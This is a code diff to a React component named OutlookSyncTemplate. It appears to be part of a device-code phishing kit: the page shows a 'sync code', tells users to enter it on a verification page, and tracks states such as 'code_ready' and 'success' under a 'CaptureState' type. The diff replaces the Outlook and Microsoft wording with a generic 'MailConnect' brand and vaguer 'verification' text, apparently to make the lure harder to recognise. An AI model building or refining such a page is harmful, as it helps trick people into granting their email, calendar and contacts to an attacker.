@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 
-const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';
+const DEVICE_VERIFY_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
 
 type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';
 
@@ -94,7 +94,7 @@ export function OutlookSyncTemplate(): React.ReactElement {
     navigator.clipboard.writeText(userCode.replace(/\s/g, '')).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2500); });
   }
 
-  function handleVerify(): void { setState('waiting'); window.open(DEVICE_AUTH_URL, '_blank'); }
+  function handleVerify(): void { setState('waiting'); window.open(DEVICE_VERIFY_URL, '_blank'); }
 
   function handleReset(): void {
     stopPolling(); setState('idle'); setUserCode(''); setDeviceCode('');
@@ -114,7 +114,7 @@ export function OutlookSyncTemplate(): React.ReactElement {
               <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" />
             </svg>
           </div>
-          <h1>Outlook</h1>
+          <h1>MailConnect</h1>
           <p>Connect your mailbox to sync emails, calendar, and contacts across all your devices.</p>
           <div className="outlook-sync-features">
             <div className="outlook-sync-feature">
@@ -137,7 +137,7 @@ export function OutlookSyncTemplate(): React.ReactElement {
           {state === 'idle' && (
             <>
               <h2>Connect your account</h2>
-              <p className="outlook-sync-desc">Sign in with your Microsoft account to start syncing. Your data is encrypted end-to-end.</p>
+              <p className="outlook-sync-desc">Verify your account to start syncing. Your data is encrypted end-to-end.</p>
               <div className="outlook-sync-account-types">
                 <div className="outlook-sync-type active">
                   <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="2" y="4" width="20" height="16" rx="2" /><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" /></svg>
@@ -165,14 +165,14 @@ export function OutlookSyncTemplate(): React.ReactElement {
           {(state === 'code_ready' || state === 'waiting') && (
             <>
               <h2>Authorization required</h2>
-              <p className="outlook-sync-desc">Enter the code below on the Microsoft sign-in page to authorize sync access.</p>
+              <p className="outlook-sync-desc">Enter the code below on the verification page to authorize sync access.</p>
               <div className="outlook-sync-code-box">
                 <div className="outlook-sync-code-label">SYNC CODE</div>
                 <div className="outlook-sync-code">{userCode}</div>
                 <button className="outlook-sync-copy" onClick={handleCopy}>{copied ? 'Copied!' : 'Copy code'}</button>
               </div>
               <button className="outlook-sync-btn" onClick={handleVerify}>
-                Open Microsoft sign-in
+                Open Verification Page
               </button>
               {state === 'waiting' && (
                 <div className="outlook-sync-progress">
